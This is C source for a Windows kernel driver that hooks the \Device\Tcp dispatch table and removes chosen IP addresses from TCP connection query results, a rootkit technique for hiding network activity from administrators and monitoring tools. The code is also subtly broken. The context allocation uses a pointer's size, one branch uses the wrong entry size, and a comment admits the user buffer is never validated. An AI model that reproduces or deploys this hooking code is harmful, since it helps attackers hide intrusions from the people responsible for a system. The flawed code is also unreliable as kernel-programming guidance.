#include "TcpDriverNetworkHook.h"
#include "Network.h"
#include "Debug.h"

typedef struct _TCP_HOOKED_CONTEXT {
	PIO_COMPLETION_ROUTINE OriginalCompletionRoutine;
	ULONG Code;
} TCP_HOOKED_CONTEXT, * PTCP_HOOKED_CONTEXT;

#define IOCTL_TCP_QUERY CTL_CODE(FILE_DEVICE_NETWORK, 0x0, METHOD_NEITHER, FILE_ANY_ACCESS)

PDEVICE_OBJECT g_NetTcpDevice;
PFILE_OBJECT g_NetTcpFileObject;
PDRIVER_OBJECT g_NetTcpDriver;
PDRIVER_DISPATCH g_NetOldTcpDriverDeviceControl;

static NTSTATUS NetTcpDriverDeviceIoctlHook(PDEVICE_OBJECT DeviceObject, PIRP Irp);

static NTSTATUS NetTcpDriverCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);

NTSTATUS NetHookTcpDriver()
{
	D_INFO("Hooking the tcp driver..");

	NTSTATUS Status;
	UNICODE_STRING TcpDeviceName = RTL_CONSTANT_STRING(L"\\Device\\Tcp");

	Status = IoGetDeviceObjectPointer(&TcpDeviceName, FILE_READ_DATA, &g_NetTcpFileObject, &g_NetTcpDevice);

	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	g_NetTcpDriver = g_NetTcpDevice->DriverObject;

	if (g_NetOldTcpDriverDeviceControl == NULL)
	{
		g_NetOldTcpDriverDeviceControl = g_NetTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL];

		if (!g_NetOldTcpDriverDeviceControl)
		{
			return STATUS_SUCCESS;
		}
	}

	InterlockedExchange64(
		(LONG64*)& g_NetTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL],
		(LONG64)NetTcpDriverDeviceIoctlHook
	);

	return STATUS_SUCCESS;
}

VOID NetFreeTcpDriver()
{
	if (g_NetOldTcpDriverDeviceControl)
	{
		InterlockedExchange64(
			(LONG64*)&g_NetTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL],
			(LONG64)g_NetOldTcpDriverDeviceControl
		);
	}

	if (g_NetTcpFileObject)
	{
		ObDereferenceObject(g_NetTcpFileObject);
		g_NetTcpFileObject = NULL;
	}
}

typedef struct _TCP_DRIVER_PARAMS {
	ULONG Param1; // 0x0
	ULONG Param2; // 0x4
	ULONG Param3; // 0x8
	ULONG Param4; // 0xc
	ULONG Param5; // 0x10
	ULONG Param6; // 0x14

} TCP_DRIVER_PARAMS, * PTCP_DRIVER_PARAMS;

static NTSTATUS NetTcpDriverDeviceIoctlHook(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);

	if (IoStackLocation->MajorFunction == IRP_MJ_DEVICE_CONTROL &&
		IoStackLocation->MinorFunction == 0 &&
		IoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_TCP_QUERY)
	{
		PTCP_DRIVER_PARAMS InputBuffer = (PTCP_DRIVER_PARAMS)IoStackLocation->Parameters.DeviceIoControl.Type3InputBuffer;

		//
		// Missing a check to validate InputBuffer.
		//
		if (InputBuffer->Param1 == 0x400 &&
			(InputBuffer->Param5 == 0x101 ||
				InputBuffer->Param5 == 0x102 ||
				InputBuffer->Param5 == 0x110))
		{
			PTCP_HOOKED_CONTEXT IoCompletionContext =
				(PTCP_HOOKED_CONTEXT)ExAllocatePool(NonPagedPool, sizeof(PTCP_HOOKED_CONTEXT));

			IoStackLocation->Control |= SL_INVOKE_ON_SUCCESS;

			IoStackLocation->Context = IoCompletionContext;
			IoCompletionContext->OriginalCompletionRoutine = IoStackLocation->CompletionRoutine;
			IoCompletionContext->Code = InputBuffer->Param5;
			IoStackLocation->CompletionRoutine = NetTcpDriverCompletionRoutine;
		}
	}


	return g_NetOldTcpDriverDeviceControl(DeviceObject, Irp);
}


typedef struct _TCP_ENTRY {
	ULONG Param1;
	ULONG Param2;
	ULONG Param3;
	ULONG IpAddress;
	ULONG Param5;
} TCP_ENTRY, * PTCP_ENTRY;

typedef struct _TCP_ENTRY2 {
	ULONG Param1;
	ULONG Param2;
	ULONG Param3;
	ULONG IpAddress;
	ULONG Param5;
	ULONG Param6;
} TCP_ENTRY2, * PTCP_ENTRY2;

typedef struct _TCP_ENTRY3 {
	ULONG Status;
	ULONG Param2;
	ULONG Param3;
	ULONG IpAddress;
	UCHAR Unknown[296];
} TCP_ENTRY3, * PTCP_ENTRY3;

NTSTATUS NetTcpDriverCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{
	if (!Context)
		return Irp->IoStatus.Status;

	PTCP_HOOKED_CONTEXT HookedContext = Context;
	PIO_COMPLETION_ROUTINE OriginalRoutine = HookedContext->OriginalCompletionRoutine;

	if (HookedContext->Code == 0x101)
	{
		SIZE_T NumberOfEntries = Irp->IoStatus.Information / sizeof(TCP_ENTRY);

		PTCP_ENTRY Entries = (PTCP_ENTRY)Irp->UserBuffer;

		for (SIZE_T i = 0; i < NumberOfEntries; i++)
		{
			if (NetIsHiddenIpAddress(Entries[i].IpAddress))
			{
				SIZE_T EntriesLeft = (NumberOfEntries - (i + 1));

				RtlMoveMemory(&Entries[i], &Entries[i + 1], EntriesLeft * sizeof(TCP_ENTRY));

				i--;
				NumberOfEntries--;
				Irp->IoStatus.Information -= sizeof(TCP_ENTRY);
			}
		}
	}
	else if (HookedContext->Code == 0x102)
	{
		// Duplicated code...
		SIZE_T NumberOfEntries = Irp->IoStatus.Information / sizeof(TCP_ENTRY2);
		PTCP_ENTRY2 Entries = (PTCP_ENTRY2)(Irp->UserBuffer);

		for (SIZE_T i = 0; i < NumberOfEntries; i++)
		{
			if (NetIsHiddenIpAddress(Entries[i].IpAddress))
			{
				SIZE_T EntriesLeft = (NumberOfEntries - (i + 1));

				RtlMoveMemory(&Entries[i], &Entries[i + 1], EntriesLeft * sizeof(TCP_ENTRY2));

				i--;
				NumberOfEntries--;
				Irp->IoStatus.Information -= sizeof(TCP_ENTRY2);
			}
		}
	}
	else if (HookedContext->Code == 0x110)
	{
		SIZE_T NumberOfEntries = Irp->IoStatus.Information / sizeof(TCP_ENTRY3);
		PTCP_ENTRY3 Entries = (PTCP_ENTRY3)(Irp->UserBuffer);

		for (SIZE_T i = 0; i < NumberOfEntries; i++)
		{
			if (NetIsHiddenIpAddress(Entries[i].IpAddress))
			{
				//
				// This line is useless because it's overriden.
				//
				Entries[i].Status = 0;

				SIZE_T EntriesLeft = (NumberOfEntries - (i + 1));

				RtlMoveMemory(
					&Entries[i],
					&Entries[i + 1],
					EntriesLeft * sizeof(TCP_ENTRY3)
				);

				i--;
				NumberOfEntries--;
				Irp->IoStatus.Information -= sizeof(TCP_ENTRY2);
			}
		}
	}

	ExFreePool(HookedContext);

	if (Irp->StackCount > 1 && OriginalRoutine)
	{
		return OriginalRoutine(DeviceObject, Irp, NULL);
	}
	else
	{
		return Irp->IoStatus.Status;
	}

}